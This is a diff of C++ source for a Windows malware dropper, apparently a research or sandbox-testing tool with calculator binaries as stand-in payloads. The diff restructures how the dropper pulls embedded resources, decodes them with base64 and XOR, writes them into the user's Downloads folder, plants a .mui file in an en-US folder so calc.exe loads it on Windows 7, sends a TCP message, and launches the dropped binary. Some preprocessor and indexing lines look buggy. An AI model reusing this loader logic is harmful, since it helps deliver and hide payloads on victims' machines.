@@ -74,8 +74,8 @@ void* XOR(void* data, DWORD size);
 void* base64decode(void* data, DWORD* size);
 bool non_exe_launch(std::wstring);
 void exe_launch(std::wstring);
-void set_name(std::uint64_t);
-void setup_name(std::uint64_t);
+std::wstring set_name(std::wstring*, bool);
+std::wstring setup_name(std::wstring, bool);
 
 
 // Dropper Configurations
@@ -91,8 +91,6 @@ void setup_name(std::uint64_t);
 // global: final binary name
 
 typedef LONG(WINAPI* RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
-std::uint64_t os_version;
-HMODULE h;
 
 std::string message = "This is a message sent from the dropper";
 int result;
@@ -101,155 +99,88 @@ int result;
 // 2 w7_calc.exe.mui
 //32 w11_calc.exe (calculator for windows 11)
 
-std::wstring name1;
-std::wstring name2;
-std::wstring name3;
-
-HRSRC r1;
-HRSRC r2;
-HRSRC r3;
-
-HGLOBAL rc1;
-HGLOBAL rc2;
-HGLOBAL rc3;
-
-void* data1;
-void* data2;
-void* data3;
-
-DWORD size1;
-DWORD size2;
-DWORD size3;
-
-// Entry Point
-int main(int argc, char* argv[])
+int main()
 {
 
 	LoadLibraryW(L"mscoree.dll");
+	// To my understanding Windows handles this by default but Cuckoo sandbox would have 
+	// issues with loading it automatically.
 
 	int result = send_message(message);
 	if (result == 1) {
+		std::cerr << "The dropper didn't send the tcp output";
 		return result;
 	}
 
-	os_version = check_version();
-
-	setup_name(os_version);
-
-	set_name(os_version);
+	std::uint64_t os_version = check_version();
 
 	int datalen = 0;
-	int start_array[2];
+	int bintype_array[2];
 
 	if (os_version == 0){
+		// Runs as if it is Windows 10+
 		std::cout << "Couldn't verify the OS version";
 		datalen = 1;
-		start_array[0] = 3;
+		bintype_array[0] = IDR_BIN3;
+		bintype_array[1] = NULL;
 
 	} else if (os_version == 6){
 		datalen = 2;
-		start_array[0] = 1;
-		start_array[1] = 2;
+		bintype_array[0] = IDR_BIN1;
+		bintype_array[1] = IDR_BIN2;
 
 	} else {
 		datalen = 1;
-		start_array[0] = 3;
+		bintype_array[0] = IDR_BIN3;
+		bintype_array[1] = NULL;
 
 	}
 
+	HMODULE h = GetModuleHandle(NULL);
 
-	if (os_version == 0){
+	LPVOID data_array[2];
+	DWORD size_array[2];
+	std::wstring name_array[2];
 
-		dropper_start(3);
+	for (int i = 0; i < datalen; i++) {
+
+
+		HRSRC r = FindResource(h, MAKEINTRESOURCE(bintype_array[i]), MAKEINTRESOURCE(BIN));
+		// Load Resource
+		HGLOBAL rc = LoadResource(h, r);
+		// Ensure nobody else will handle it
+		data_array[i] = LockResource(rc);
+		// Get embedded file size
+		size_array[i] = SizeofResource(h, r);
+		// Ensure nobody else will handle it
+
+		if (i != 0) {
+			name_array[i] = setup_name(name_array[i], false);
+			name_array[i] = set_name(name_array, false);
+		} else {
+			name_array[i] = setup_name(name_array[i], true);
+			name_array[i] = set_name(name_array, true);
+		}
+
+		if (bintype_array[i] != NULL) {
+
 	#ifdef DROPPER_BASE64 == 1
-		data3 = base64decode(data3, &size3);
+			data_array[i] = base64decode(data_array[i], &size_array[i]);
 	#endif
 
 	#if DROPPER_XOR_KEY != 0
-		data3 = XOR(data3, size3);
+			data_array[i] = XOR(data_array[i], size_array[i]);
 	#endif
 
-		drop(size3, data3, name3);
-
-		exe_launch(name3);
+			drop(size_array[i], data_array[i], name_array[i]);
+		}
+	}
+		exe_launch(name_array[0]);
 
 	#ifdef DEAD_CODE
 		// dead code
 		dead();
 	#endif
-
-
-		return 0;
-	}
-
-	else if (os_version == 6) {
-
-////////////////////////////////////////////
-
-//             Windows 7 regular version of dropper
-
-////////////////////////////////////////////
-
-		dropper_start(1);
-		dropper_start(2);
-
-	#if DROPPER_BASE64 == 1
-		data1 = base64decode(data1, &size1);
-		data2 = base64decode(data2, &size2);
-
-	#endif
-
-	#if DROPPER_XOR_KEY != 0
-		data1 = XOR(data1, size1);
-		data2 = XOR(data2, size2);
-	#endif
-
-		drop(size1, data1, name1);
-		drop(size2, data2, name2);
-
-		exe_launch(name1);
-
-#ifdef DEAD_CODE
-		// dead code
-		dead();
-	// exit without waiting child process
-#endif
-
-	}
-
-////////////////////////////////////////////////////////
-
-	// Windows 10/11 handling of dropper
-
-////////////////////////////////////////////////////////
-
-	else if (os_version == 10) {
-
-		dropper_start(3);
-
-	#ifdef DROPPER_BASE64 == 1
-		data3 = base64decode(data3, &size3);
-	#endif
-
-	#if DROPPER_XOR_KEY != 0
-		data3 = XOR(data3, size3);
-	#endif
-
-		drop(size3, data3, name3);
-
-		exe_launch(name3);
-
-	#ifdef DEAD_CODE
-		// dead code
-		dead();
-	#endif
-
-	}
-
-	else {
-		std::cout << "OS that couldn't be handled.";
-		return 0;
-	}
 
 	// exit without waiting child process
 	return 0;
@@ -317,48 +248,29 @@ std::uint64_t check_version(){
 }
 
 // Gets the upper part of the file path for the respective name (name1, name2, etc.)
-void setup_name(std::uint64_t os_version) {
-	if (os_version == 0){
-		return;
-	}
-	else if (os_version == 6){
-
-		const wchar_t* temp = _wgetenv(L"USERPROFILE");
-		if (temp != nullptr){
-			name1 += temp;
-			name1 += L"\\Downloads";
-			name2 += temp;
-			name2 += L"\\Downloads\\en-US";
-			CreateDirectoryW(name2.c_str(), NULL);
-
-		} else {
-			printf("Problem with userprofile");
+std::wstring setup_name(std::wstring name, bool use_second) {
+	const wchar_t* temp = _wgetenv(L"USERPROFILE");
+	if (temp != nullptr){
+		if (use_second == false) {
+			name += temp;
+			name += L"\\Downloads";
 		}
-
-	}
-	else if (os_version == 10){
-
-		const wchar_t* temp = _wgetenv(L"USERPROFILE");
-		if (temp != nullptr){
-			name3 += temp;
-			name3 += L"\\Downloads";
-
-		} else {
-			printf("Problem with userprofile");
+		else {
+			name += temp;
+			name += L"\\Downloads\\en-US";
+			CreateDirectoryW(name.c_str(), NULL);
 		}
+	} else {
+		printf("Problem with userprofile");
 	}
-	else {
-		std::cout << "Name wasn't given because of unknown OS\n";
-	}
+
+	return name;
+
 }
 
 // Adds the lower end of the filepath to the respective name (name1, name2, etc.).
-void set_name(std::uint64_t os_version)
+std::wstring set_name( std::wstring name_array[], bool use_second)
 {
-	if (os_version == 0) {
-		std::cout << "Could not set name due to invalid OS\n";
-	}
-	else if (os_version == 6) {
 
 
 #ifdef RANDOM_NAME
@@ -369,33 +281,7 @@ void set_name(std::uint64_t os_version)
 			char c = rand();
 			if (c >= 'a' && c <= 'z')
 			{
-				name1.push_back(c);
-			}
-		}
-		name3 = name1 + L".mui";
-#else
-
-		const char* drop = DROPPER_OUTPUT;
-		int size = MultiByteToWideChar(CP_UTF8, 0, drop, -1, nullptr, 0);
-		std::wstring out(size-1, L'\0');
-		MultiByteToWideChar(CP_UTF8, 0, drop, -1, out.data(), size);
-		name1+=out;
-		name2+=out;
-		name2+=L".mui";
-#endif
-	}
-
-	else if (os_version == 10) {
-
-#ifdef RANDOM_NAME
-		int valid = 0;
-		srand(time(NULL));
-		while (valid < NAME_SIZE)
-		{
-			char c = rand();
-			if (c >= 'a' && c <= 'z')
-			{
-				name3.push_back(c);
+				name_array[0].push_back(c);
 			}
 		}
 #else
@@ -404,51 +290,13 @@ void set_name(std::uint64_t os_version)
 		int size = MultiByteToWideChar(CP_UTF8, 0, drop, -1, nullptr, 0);
 		std::wstring out(size-1, L'\0');
 		MultiByteToWideChar(CP_UTF8, 0, drop, -1, out.data(), size);
-
-		name3+=out;
-
+		name_array[0]+=out;
 #endif
-	}
-
-	else {
-		std::cout << "Cannot set name for unsupported OS\n";
-	}
-
-}
-
-void dropper_start(int x){
-	switch(x) {
-		case 1:
-			// Locate Resource
-			r1 = FindResource(h, MAKEINTRESOURCE(IDR_BIN1), MAKEINTRESOURCE(BIN));
-			// Load Resource
-			rc1 = LoadResource(h, r1);
-			// Ensure nobody else will handle it
-			data1 = LockResource(rc1);
-			// Get embedded file size
-			size1 = SizeofResource(h, r1);
-			break;
-		case 2:
-			// Locate Resource
-			r2 = FindResource(h, MAKEINTRESOURCE(IDR_BIN2), MAKEINTRESOURCE(BIN));
-			// Load Resource
-			rc2 = LoadResource(h, r2);
-			// Ensure nobody else will handle it
-			data2 = LockResource(rc2);
-			// Get embedded file size
-			size2 = SizeofResource(h, r2);
-			break;
-		case 3:
-
-			r3 = FindResource(h, MAKEINTRESOURCE(IDR_BIN3), MAKEINTRESOURCE(BIN));
-			rc3 = LoadResource(h, r3);
-			// Ensure nobody else will handle it
-			data3 = LockResource(rc3);
-			// Get embedded file size
-			size3 = SizeofResource(h, r3);
-			break;
-		default:
-			std::cout << "cannot happen";
+	if (use_second == true) {
+		name_array[1] = name_array[0] + L".mui";
+		return name_array[1];
+	} else {
+		return name_array[0];
 	}
 
 }
